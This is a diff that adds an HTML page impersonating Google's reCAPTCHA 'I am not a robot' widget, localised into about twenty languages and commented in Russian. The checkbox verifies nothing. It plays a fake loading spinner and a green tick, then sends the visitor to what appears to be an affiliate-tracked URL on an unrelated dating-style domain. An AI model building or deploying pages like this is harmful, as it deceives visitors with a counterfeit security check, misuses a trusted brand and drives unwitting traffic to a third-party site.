@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>reCAPTCHA</title>
+    <style>
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            margin: 0;
+            background-color: #f9f9f9;
+            overflow: hidden;
+        }
+        .container {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            gap: 10px;
+        }
+        .captcha-container {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            width: 300px;
+            padding: 10px;
+            border: 1px solid #dfe1e5;
+            border-radius: 4px;
+            background-color: #fff;
+        }
+        .captcha-container[lang="el"], 
+        .captcha-container[lang="ps"], 
+        .captcha-container[lang="ur"], 
+        .captcha-container[lang="tl"] {
+            width: 320px;
+        }
+        .captcha-left {
+            display: flex;
+            align-items: center;
+        }
+        .captcha-checkbox {
+            margin-right: 10px;
+            width: 20px;
+            height: 20px;
+            cursor: pointer;
+            border: 2px solid #000;
+            background-color: transparent;
+            position: relative;
+            appearance: none;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+        }
+        .captcha-checkbox.loading {
+            border: none;
+            background-color: transparent;
+        }
+        .captcha-checkbox.loading::before {
+            content: '';
+            width: 20px;
+            height: 20px;
+            border: 3px solid #1a73e8;
+            border-top-color: transparent;
+            border-radius: 50%;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            animation: spin 0.8s linear infinite;
+        }
+        .captcha-checkbox.completed {
+            border: none;
+            background-color: transparent;
+        }
+        .captcha-checkbox.completed::before {
+            content: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="34" height="34" viewBox="0 0 28 28" fill="none" stroke="green" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>');
+            position: absolute;
+            top: 65%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            display: block;
+        }
+        @keyframes spin {
+            0% { transform: translate(-50%, -50%) rotate(0deg); }
+            100% { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+        .captcha-text {
+            font-size: 13px;
+            color: #000;
+            white-space: nowrap;
+        }
+        [lang="el"] .captcha-text, 
+        [lang="ps"] .captcha-text, 
+        [lang="ur"] .captcha-text, 
+        [lang="tl"] .captcha-text {
+            font-size: 12px;
+        }
+        .captcha-right {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+        }
+        .captcha-logo {
+            width: 20px;
+            height: 20px;
+            margin-bottom: 5px;
+        }
+        .captcha-brand {
+            font-size: 11px;
+            color: #757575;
+        }
+        .captcha-links {
+            font-size: 9px;
+            color: #757575;
+        }
+        .captcha-links a {
+            color: #757575;
+            text-decoration: none;
+        }
+        .submit-button {
+            padding: 8px 16px;
+            background-color: #f1f3f4;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 13px;
+            color: #202124;
+            cursor: pointer;
+            white-space: nowrap;
+        }
+        [lang="el"] .submit-button, 
+        [lang="ps"] .submit-button, 
+        [lang="ur"] .submit-button, 
+        [lang="tl"] .submit-button {
+            font-size: 12px;
+        }
+        .submit-button:hover {
+            background-color: #e8eaed;
+        }
+        .button-container {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+        .error {
+            color: red;
+            font-size: 11px;
+            display: none;
+            margin-top: 5px;
+            white-space: nowrap;
+        }
+        body[lang="ar"], body[lang="ur"] {
+            direction: rtl;
+            text-align: right;
+        }
+        .captcha-container[lang="ar"], .captcha-container[lang="ur"] {
+            flex-direction: row-reverse;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="captcha-container">
+            <div class="captcha-left">
+                <input type="checkbox" id="captcha" class="captcha-checkbox">
+                <span class="captcha-text">I am not a robot</span>
+            </div>
+            <div class="captcha-right">
+                <img src="https://www.melett.ru/wp-content/uploads/2023/09/recaptcha-logo-icon.png" class="captcha-logo" alt="reCAPTCHA">
+                <span class="captcha-brand">reCAPTCHA</span>
+                <div class="captcha-links">
+                    <a href="https://policies.google.com/privacy" target="_blank" id="privacy-link">Privacy</a> - 
+                    <a href="https://policies.google.com/terms" target="_blank" id="terms-link">Terms</a>
+                </div>
+            </div>
+        </div>
+        <div class="button-container">
+            <button class="submit-button" id="submit-button">Submit</button>
+            <div class="error" id="error">Please verify that you are not a robot.</div>
+        </div>
+    </div>
+
+    <script>
+        // Определение языка браузера
+        const userLanguage = (navigator.language || navigator.userLanguage || 'en').split('-')[0];
+        const supportedLanguages = ['ru', 'en', 'es', 'fr', 'de', 'it', 'pt', 'zh', 'ja', 'ko', 'ar', 'hi', 'tr', 'uk', 'hu', 'el', 'tl', 'ur', 'nl', 'ps', 'id'];
+        const lang = supportedLanguages.includes(userLanguage) ? userLanguage : 'en';
+
+        // Объект с переводами
+        const translations = {
+            ru: {
+                title: 'reCAPTCHA',
+                captchaText: 'Я не робот',
+                submitButton: 'Отправить',
+                error: 'Пожалуйста, подтвердите, что вы не робот.',
+                privacy: 'Конфиденциальность',
+                terms: 'Условия'
+            },
+            en: {
+                title: 'reCAPTCHA',
+                captchaText: 'I am not a robot',
+                submitButton: 'Submit',
+                error: 'Please verify that you are not a robot.',
+                privacy: 'Privacy',
+                terms: 'Terms'
+            },
+            es: {
+                title: 'reCAPTCHA',
+                captchaText: 'No soy un robot',
+                submitButton: 'Enviar',
+                error: 'Por favor, verifica que no eres un robot.',
+                privacy: 'Privacidad',
+                terms: 'Términos'
+            },
+            fr: {
+                title: 'reCAPTCHA',
+                captchaText: 'Je ne suis pas un robot',
+                submitButton: 'Envoyer',
+                error: 'Veuillez vérifier que vous n\'êtes pas un robot.',
+                privacy: 'Confidentialité',
+                terms: 'Conditions'
+            },
+            de: {
+                title: 'reCAPTCHA',
+                captchaText: 'Ich bin kein Roboter',
+                submitButton: 'Absenden',
+                error: 'Bitte bestätigen Sie, dass Sie kein Roboter sind.',
+                privacy: 'Datenschutz',
+                terms: 'Nutzungsbedingungen'
+            },
+            it: {
+                title: 'reCAPTCHA',
+                captchaText: 'Non sono un robot',
+                submitButton: 'Invia',
+                error: 'Per favore, verifica di non essere un robot.',
+                privacy: 'Privacy',
+                terms: 'Termini'
+            },
+            pt: {
+                title: 'reCAPTCHA',
+                captchaText: 'Não sou um robô',
+                submitButton: 'Enviar',
+                error: 'Por favor, confirme que você não é um robô.',
+                privacy: 'Privacidade',
+                terms: 'Termos'
+            },
+            zh: {
+                title: 'reCAPTCHA',
+                captchaText: '我不是机器人',
+                submitButton: '提交',
+                error: '请验证您不是机器人。',
+                privacy: '隐私',
+                terms: '条款'
+            },
+            ja: {
+                title: 'reCAPTCHA',
+                captchaText: '私はロボットではありません',
+                submitButton: '送信',
+                error: 'ロボットでないことを確認してください。',
+                privacy: 'プライバシー',
+                terms: '利用規約'
+            },
+            ko: {
+                title: 'reCAPTCHA',
+                captchaText: '나는 로봇이 아닙니다',
+                submitButton: '제출',
+                error: '로봇이 아님을 확인해 주세요.',
+                privacy: '개인정보',
+                terms: '약관'
+            },
+            ar: {
+                title: 'reCAPTCHA',
+                captchaText: 'أنا لست روبوتًا',
+                submitButton: 'إرسال',
+                error: 'يرجى التحقق من أنك لست روبوتًا.',
+                privacy: 'الخصوصية',
+                terms: 'الشروط'
+            },
+            hi: {
+                title: 'reCAPTCHA',
+                captchaText: 'मैं रोबोट नहीं हूँ',
+                submitButton: 'जमा करें',
+                error: 'कृपया सत्यापित करें कि आप रोबोट नहीं हैं।',
+                privacy: 'गोपनीयता',
+                terms: 'शर्तें'
+            },
+            tr: {
+                title: 'reCAPTCHA',
+                captchaText: 'Robot değilim',
+                submitButton: 'Gönder',
+                error: 'Lütfen robot olmadığınızı doğrulayın.',
+                privacy: 'Gizlilik',
+                terms: 'Şartlar'
+            },
+            uk: {
+                title: 'reCAPTCHA',
+                captchaText: 'Я не робот',
+                submitButton: 'Надіслати',
+                error: 'Будь ласка, підтвердьте, що ви не робот.',
+                privacy: 'Конфіденційність',
+                terms: 'Умови'
+            },
+            hu: {
+                title: 'reCAPTCHA',
+                captchaText: 'Nem vagyok robot',
+                submitButton: 'Küldés',
+                error: 'Kérjük, erősítse meg, hogy nem robot.',
+                privacy: 'Adatvédelem',
+                terms: 'Feltételek'
+            },
+            el: {
+                title: 'reCAPTCHA',
+                captchaText: 'Δεν είμαι ρομπότ',
+                submitButton: 'Υποβολή',
+                error: 'Παρακαλώ επαληθεύστε ότι δεν είστε ρομπότ.',
+                privacy: 'Απόρρητο',
+                terms: 'Όροι'
+            },
+            tl: {
+                title: 'reCAPTCHA',
+                captchaText: 'Hindi ako robot',
+                submitButton: 'Ipasa',
+                error: 'Paki-verify na hindi ka robot.',
+                privacy: 'Privacy',
+                terms: 'Mga Tuntunin'
+            },
+            ur: {
+                title: 'reCAPTCHA',
+                captchaText: 'میں روبوٹ نہیں ہوں',
+                submitButton: 'جمع کرائیں',
+                error: 'براہ کرم تصدیق کریں کہ آپ روبوٹ نہیں ہیں۔',
+                privacy: 'رازداری',
+                terms: 'شرائط'
+            },
+            nl: {
+                title: 'reCAPTCHA',
+                captchaText: 'Ik ben geen robot',
+                submitButton: 'Verzenden',
+                error: 'Controleer of u geen robot bent.',
+                privacy: 'Privacy',
+                terms: 'Voorwaarden'
+            },
+            ps: {
+                title: 'reCAPTCHA',
+                captchaText: 'زه روبوټ نه یم',
+                submitButton: 'سپارل',
+                error: 'مهرباني وکړئ تصدیق کړئ چې تاسو روبوټ نه یاست.',
+                privacy: 'محرمیت',
+                terms: 'شرایط'
+            },
+            id: {
+                title: 'reCAPTCHA',
+                captchaText: 'Saya bukan robot',
+                submitButton: 'Kirim',
+                error: 'Harap verifikasi bahwa Anda bukan robot.',
+                privacy: 'Privasi',
+                terms: 'Syarat'
+            }
+        };
+
+        // Применение переводов
+        function applyTranslations() {
+            document.documentElement.lang = lang;
+            document.title = translations[lang].title;
+            document.querySelector('.captcha-text').textContent = translations[lang].captchaText;
+            document.getElementById('submit-button').textContent = translations[lang].submitButton;
+            document.getElementById('error').textContent = translations[lang].error;
+            document.getElementById('privacy-link').textContent = translations[lang].privacy;
+            document.getElementById('terms-link').textContent = translations[lang].terms;
+        }
+
+        applyTranslations();
+
+        // Ссылка для редиректа
+        const redirectUrl = 'https://gxrjxq.excelientdates.com/?utm_source=da57dc555e50572d&ban=other&j1=1&s1=96847&s2=2070502&s3=yd75';
+
+        // Обработка чекбокса
+        const checkbox = document.getElementById('captcha');
+        const error = document.getElementById('error');
+
+        checkbox.addEventListener('click', function () {
+            if (checkbox.classList.contains('completed')) return;
+
+            checkbox.classList.add('loading');
+            checkbox.disabled = true;
+            error.style.display = 'none';
+
+            setTimeout(() => {
+                checkbox.classList.remove('loading');
+                checkbox.classList.add('completed');
+                checkbox.disabled = false;
+
+                setTimeout(() => {
+                    window.location.href = redirectUrl;
+                }, 1000);
+            }, 2000);
+        });
+
+        // Обработка кнопки Submit
+        document.getElementById('submit-button').addEventListener('click', function () {
+            if (!checkbox.classList.contains('completed')) {
+                error.style.display = 'block';
+            } else {
+                error.style.display = 'none';
+                window.location.href = redirectUrl;
+            }
+        });
+    </script>
+</body>
+</html>
